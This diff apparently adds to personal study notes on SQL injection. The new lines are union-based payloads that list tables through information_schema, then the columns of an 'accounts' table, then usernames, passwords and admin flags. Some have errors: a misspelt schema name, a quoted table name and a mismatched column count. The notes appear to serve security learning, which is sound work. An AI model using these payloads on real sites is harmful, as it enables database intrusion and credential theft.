@@ -116,5 +116,27 @@ __URL Encoding__:  http://www.site.com/news/php=7' order by 1 %23
 
 order by shows how many columns in the DB
 
->>
+ &nbsp; 
+ &nbsp
+
+>> ' union select 1, table_name, null, null, null, 5 from Infromation_schema.tables where table_schema = 'owasdb'
+
+__information_schema__ is a default schema in every database
+
+__table_schema__ is the database name 
+
+__table_name__ is the name of the table 
+
+
+The above SQL command should return the name of the schemas in the database 
+
+ &nbsp; 
+ &nbsp
+ 
+>>>> ' union select 1, column_name, null, null, null, 5 from Infromation_schema.columns where table_name = 'accounts'
+
+>>> ' union select username, pass, is_admin from 'accounts'
+
+
+
 
